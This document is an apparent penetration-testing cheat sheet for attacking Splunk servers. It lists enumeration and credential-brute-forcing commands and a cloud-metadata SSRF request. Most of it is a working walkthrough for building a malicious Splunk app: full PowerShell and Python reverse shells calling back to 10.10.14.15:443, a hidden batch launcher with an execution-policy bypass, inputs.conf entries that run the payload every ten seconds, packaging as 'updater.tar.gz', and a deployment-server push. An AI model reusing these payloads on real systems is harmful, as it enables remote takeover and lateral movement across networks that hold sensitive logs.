# 1. Discovery/Footprinting
## 1.1 Nmap Port Scan
sudo nmap -sV <target_ip> -p 8000,8089
Identify Splunkd httpd (port 8000/8089).
## 1.2 Web Interface Access
```
http://<target_ip>:8000
Default credentials (older versions): admin:changeme
Common weak passwords: admin, Welcome, Password123
Check for Splunk Free (no authentication).
```
## 1.3 Version Detection
Check web interface headers, or API responses.
# 2. Enumeration
## 2.1 Splunk Free Check
No login prompt = possible Splunk Free.
## 2.2 Web Interface Exploration
Data browsing, reports, dashboards.
Installed Splunkbase applications.
## 2.3 Scripted Inputs (RCE)
Create inputs for Bash, PowerShell, Python.
Python reverse shell example (scripted input):
```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
## 2.4 REST API (Port 8089)
Enumerate for vulnerabilities.
Use tools like curl or Python requests.
Example REST API Enumeration:
```
curl -k -u admin:changeme https://<target_ip>:8089/services/server/info
```
## 2.5 Vulnerability Scanning
Use vulnerability scanners (e.g., Nessus, OpenVAS).
Search CVE databases (NVD, Exploit-DB).
## 2.6 SSRF
Test for SSRF vulnerabilities.
Example SSRF Exploitation:
```
curl -k -X POST -H "Content-Type: application/x-www-form-urlencoded" \
-d "splunk_server=127.0.0.1&remote_server=http://169.254.169.254/latest/meta-data/" \
https://<target_ip>:8089/en-US/splunkd/__raw/services/data/inputs/http
```
## 2.7 Credential Brute-forcing
Attempt brute forcing Splunk credentials.
Example using hydra:
```
hydra -L users.txt -P passwords.txt <target_ip> http-form-post "/en-US/account/login:username=^USER^&password=^PASS^:Invalid username or password"
```
## 2.8 Splunk Log Extraction (if accessible)
curl -k -u admin:changeme https://<target_ip>:8089/services/search/jobs/export -d search="search index=_internal | head 10"
## 2.9 Session Hijacking (If Cookies Leak)
Capture Splunk session cookies via XSS or MITM.
Use curl or browser to replay requests:
curl -k -b "splunkd_8000=<session_cookie>" https://<target_ip>:8000/en-US/
## 2.10 Splunk Forwarder Abuse
If compromised, use forwarders to send logs elsewhere or execute scripts.
Modify inputs.conf to insert a reverse shell payload.
## 3. Key Points
- Splunk often runs as root/SYSTEM.
- Compromise = access to sensitive logs & network data.
- Scripted inputs = direct RCE.
- REST API = powerful attack vector.
- Splunk logs can contain credentials.
- Splunk logs can contain network information.
- Session cookies can be hijacked for persistence.
- Splunk forwarders can be abused for lateral movement.



## 2. Create Splunk App Directory Structure

Create the necessary directory structure for the Splunk application:

```bash
mkdir -p splunk_shell/splunk_shell/bin
mkdir -p splunk_shell/splunk_shell/default
tree splunk_shell/splunk_shell/
```

## 2. Create PowerShell Reverse Shell (Windows)

Create a PowerShell script to establish a reverse shell connection:

**File: `splunk_shell/splunk_shell/bin/rev.ps1`**

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
```

## 3. Create a Batch File to Execute PowerShell (Windows)

**File: `splunk_shell/splunk_shell/bin/run.bat`**

```batch
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```

## 4. Create Splunk App Configuration (Windows)

Configure Splunk to execute the batch file at regular intervals.

**File: `splunk_shell/splunk_shell/default/inputs.conf`**

```ini
[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```

## 5. Package the Splunk App

Create a compressed tar archive for easy deployment:

```bash
tar -cvzf updater.tar.gz splunk_shell/splunk_shell/
```

## 6. Set Up a Netcat Listener

Start a listener on port 443 to capture the reverse shell:

```bash
sudo nc -lnvp 443
```

## 7. Upload the Splunk App

1. Navigate to "Apps" -> "Manage Apps" -> "Install app from file" in Splunk Web UI.
    
2. Upload `updater.tar.gz`.
    

## 8. Create Python Reverse Shell (Linux)

For Linux systems, create a Python-based reverse shell script.

**File: `splunk_shell/splunk_shell/bin/rev.py`**

```python
import sys, socket, os, pty

ip = "10.10.14.15"
port = 443
s = socket.socket()
s.connect((ip, int(port)))
[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
pty.spawn('/bin/bash')
```

## 9. Create Splunk App Configuration (Linux)

**File: `splunk_shell/splunk_shell/default/inputs.conf`**

```ini
[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell
```

## 10. Deploy the App to Splunk Deployment Server

### Windows Deployment Server:

Copy `updater.tar.gz` to the deployment apps directory:

```bash
cp updater.tar.gz $SPLUNK_HOME/etc/deployment-apps/
```

Restart Splunk:

```bash
splunk restart
```

### Linux Deployment Server:

Copy `updater.tar.gz` to the deployment apps directory:

```bash
cp updater.tar.gz $SPLUNK_HOME/etc/deployment-apps/
```

Restart Splunk:

```bash
sudo systemctl restart splunk
```

## 11. Validate Shell Access

After gaining shell access, check the following:

```bash
whoami
hostname
pwd
```

## Key Considerations

- Ensure Netcat listener is active before running the scripts.
    
- Modify the IP address and port in scripts based on your setup.
    
- Use caution when testing on production systems.
    
- Disable PowerShell execution policies if needed.
    

This guide provides a structured method for setting up a Splunk-based reverse shell for penetration testing and security research purposes.
